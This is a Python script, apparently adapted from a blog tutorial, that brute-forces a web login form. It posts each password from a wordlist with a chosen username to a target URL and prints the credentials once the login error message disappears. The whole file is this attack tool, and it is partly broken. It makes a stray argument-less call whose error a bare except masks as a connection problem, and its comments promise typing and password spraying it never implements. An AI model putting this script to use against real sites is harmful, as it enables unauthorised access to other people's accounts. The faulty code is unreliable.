# Original code from https://blog.devgenius.io/brute-force-attack-with-python-c1d70fcba607
# Going to statically type this, use f strings and modify for password spraying (Literally swap the target usr with password)

import requests

targeturl = input("Enter Target Url: ")
targetusername = input("Enter Target Username: ")
error = input("Enter Wrong Password Error Message: ")

def bruteCracking(targetusername,targeturl,error):
    for password in passwords:
        password = password.strip()
        print(f"Trying:", {password})
        data_dict = {"username": targetusername,"password": password,"login":"submit"}
        response = requests.post(targeturl, data=data_dict)
        if error in str(response.content):
           pass
        elif "csrf" in str(response.content):
            print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
            exit(0)
        else:
            print(f"Username: ---> ", {targetusername})
            print(f"Password: ---> ", {password})
            exit(0)

#Fixed up the exception mess in the function, used __main__ to call the func and handle exception
if __name__ == '__main__':
    try:
        bruteCracking()
    except:
        print("Some Error Occurred Please Check Your Internet Connection !!")

    with open("passwords.txt", "r") as passwords:
        bruteCracking(targetusername,targeturl,error)

    print("[!!] password not in list")